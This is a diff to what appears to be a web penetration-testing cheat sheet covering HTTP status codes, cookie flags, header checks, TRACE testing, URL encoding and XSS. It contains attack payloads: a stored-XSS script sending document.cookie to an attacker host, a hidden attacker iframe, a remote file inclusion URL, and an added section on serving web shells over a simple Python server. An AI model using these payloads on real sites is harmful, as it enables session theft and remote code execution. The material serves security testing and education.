@@ -7,7 +7,7 @@ GET  Passes all query material in the URL query string.
 POST Passes all requested data in the HTTP request body.
 ------------------------------------------------------------------------------------------------------
 
-# Common Response Status Codes
+# HTTP Status Codes
 
 1xx  Informational
 100  Continue
@@ -20,6 +20,7 @@ POST Passes all requested data in the HTTP request body.
 302  Found
 
 4xx  Client Error
+400  Bad Request
 401  Unauthorized
 403  Forbidden
 404  Not Found
@@ -29,10 +30,11 @@ POST Passes all requested data in the HTTP request body.
 500  Internal Server Error
 ------------------------------------------------------------------------------------------------------
 
-# Cookies
+# Simple web server to share malicious code
 
-Secure - only send over encrypted channel
-HttpOnly - prevents JavaScript from accessing the cookie
+Change directory to where your scripts and web shells are located.
+cd /root/scripts/
+python -m SimpleHTTPServer 80
 ------------------------------------------------------------------------------------------------------
 
 # Apache version, eTag, HTTP Basic Authentication Enabled
@@ -57,6 +59,9 @@ https://targetIP/level/x/exec/-/show
 ------------------------------------------------------------------------------------------------------
 
 # Cookie Security Issues - missing HttpOnly or Secure attribute
+
+HttpOnly - prevents JavaScript from accessing the cookie
+Secure - only send over an encrypted channel
 
 Firefox
 Cookies > View Cookie Information
@@ -117,7 +122,7 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 # Remote File Inclusion
 
-http://localhost/index.php?page=http://attackerIP/evil.txt
+http://target IP/index.php?page=http://attackerIP/evil.txt
 ------------------------------------------------------------------------------------------------------
 
 # TRACE / TRACK methods allowed
@@ -127,8 +132,27 @@ OPTIONS / HTTP/1.0
 (hit enter 2x)
 
 Check for cross-site tracing (XST)
-curl -X TRACE <target>
+curl -X TRACE <target IP>
 curl -X TRACE -H "Cookie: name=value" <target>
+------------------------------------------------------------------------------------------------------
+
+# URL Encoding
+
+%20       space
+%40   @   at
+%26   &   ampersand
+%28   (   open parenthesis
+%29   )   close parenthesis
+%3B   ;   semicolon
+%22   "   double quote
+%27   '   single quote
+%3C   <   less than
+%3E   >   greater than
+%2E   .   period
+%2F   /   forward slash
+
+Example: <script>alert(document.cookie);</script>
+Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
 ------------------------------------------------------------------------------------------------------
 
 # WebDAV extensions are enabled
@@ -163,7 +187,16 @@ Ampersand            &foo
 
 Stored - example: guestbook
 <script>alert("XSS");</script>
+<script>alert(document.cookie);</script>
 <iframe SRC="http://attackerIP" height="0" width="0"></iframe>
 <script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
 
 curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
+------------------------------------------------------------------------------------------------------
+
+# External How-To
+
+http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
+http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
+https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
+https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
